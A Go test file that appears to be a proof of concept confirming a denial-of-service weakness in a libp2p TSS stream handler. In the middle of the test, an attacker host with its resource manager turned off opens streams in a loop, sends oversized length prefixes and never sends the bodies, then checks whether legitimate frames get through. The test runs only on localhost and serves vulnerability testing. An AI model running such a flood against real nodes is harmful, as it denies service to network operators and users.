package libp2p

import (
	"context"
	"encoding/binary"
	"fmt"
	"sync/atomic"
	"testing"
	"time"

	libp2praw "github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/multiformats/go-multiaddr"
	"github.com/rs/zerolog"
)

// Decisive test: does the unauthenticated flood DENY SERVICE to a legitimate
// peer's TSS stream? If yes, it is a quorum DoS independent of victim RAM
// (stream-slot / accept starvation), which no "beast machine" defeats.
func TestStarve_LegitStreamDeniedUnderFlood(t *testing.T) {
	const pid = "/push/tss/1.0.0"
	logger := zerolog.Nop()
	cfg := Config{IOTimeout: 15 * time.Second, ProtocolID: pid}
	victim, err := New(context.Background(), cfg, logger)
	if err != nil {
		t.Fatalf("victim: %v", err)
	}
	var delivered int64
	if err := victim.RegisterHandler(func(peerID string, data []byte) { atomic.AddInt64(&delivered, 1) }); err != nil {
		t.Fatalf("register: %v", err)
	}
	vID, _ := peer.Decode(victim.ID())
	vAddr, _ := multiaddr.NewMultiaddr(victim.ListenAddrs()[0])
	vInfo := peer.AddrInfo{ID: vID, Addrs: []multiaddr.Multiaddr{vAddr}}

	// legitPing: a fresh legit peer opens a stream, sends a COMPLETE valid frame
	// (len=4 + 4 bytes), and we check the victim's handler received it within a
	// timeout. Returns true if the legit message got through.
	legitPing := func(timeout time.Duration) bool {
		h, err := libp2praw.New(libp2praw.ListenAddrStrings("/ip4/127.0.0.1/tcp/0"))
		if err != nil {
			return false
		}
		defer h.Close()
		cctx, ccancel := context.WithTimeout(context.Background(), timeout)
		defer ccancel()
		if err := h.Connect(cctx, vInfo); err != nil {
			return false
		}
		before := atomic.LoadInt64(&delivered)
		sctx, scancel := context.WithTimeout(context.Background(), timeout)
		defer scancel()
		s, err := h.NewStream(sctx, vID, protocol.ID(pid))
		if err != nil {
			return false
		}
		// complete valid frame: length=4, then 4 payload bytes
		frame := make([]byte, 8)
		binary.BigEndian.PutUint32(frame[0:4], 4)
		copy(frame[4:], []byte{1, 2, 3, 4})
		if _, err := s.Write(frame); err != nil {
			return false
		}
		_ = s.CloseWrite()
		deadline := time.Now().Add(timeout)
		for time.Now().Before(deadline) {
			if atomic.LoadInt64(&delivered) > before {
				return true
			}
			time.Sleep(20 * time.Millisecond)
		}
		return false
	}

	// Baseline: with no flood, a legit ping must succeed.
	if !legitPing(5 * time.Second) {
		t.Fatalf("baseline legit ping FAILED (should succeed with no flood)")
	}
	fmt.Println("BASELINE: legit stream delivered OK (no flood)")

	// Start the flood from a single attacker peer (RM disabled attacker-side).
	atk, err := libp2praw.New(
		libp2praw.ListenAddrStrings("/ip4/127.0.0.1/tcp/0"),
		libp2praw.ResourceManager(&network.NullResourceManager{}),
	)
	if err != nil {
		t.Fatalf("attacker: %v", err)
	}
	defer atk.Close()
	if err := atk.Connect(context.Background(), vInfo); err != nil {
		t.Fatalf("attacker connect: %v", err)
	}
	stop := make(chan struct{})
	var floodOpened int64
	prefix := make([]byte, 4)
	binary.BigEndian.PutUint32(prefix, uint32(MaxFrameSize)) // 1 MiB, never send body
	for w := 0; w < 8; w++ { // 8 concurrent flooding goroutines from ONE peer
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				s, err := atk.NewStream(context.Background(), vID, protocol.ID(pid))
				if err != nil {
					continue
				}
				_, _ = s.Write(prefix)
				atomic.AddInt64(&floodOpened, 1)
			}
		}()
	}

	// Let the flood ramp, then probe legit delivery repeatedly.
	time.Sleep(3 * time.Second)
	var ok, fail int
	for i := 0; i < 10; i++ {
		got := legitPing(4 * time.Second)
		status := "DENIED"
		if got {
			ok++
			status = "delivered"
		} else {
			fail++
		}
		fmt.Printf("under-flood probe %d: %s  (floodOpened=%d)\n", i+1, status, atomic.LoadInt64(&floodOpened))
	}
	close(stop)
	fmt.Printf("RESULT under flood: legit delivered=%d DENIED=%d (of 10), total flood streams=%d\n",
		ok, fail, atomic.LoadInt64(&floodOpened))
	if fail > 0 {
		fmt.Println(">>> DoS CONFIRMED: legitimate TSS streams were denied while the flood ran <<<")
	} else {
		fmt.Println(">>> legit streams survived the flood — NOT a stream-starvation DoS at this scale <<<")
	}
}
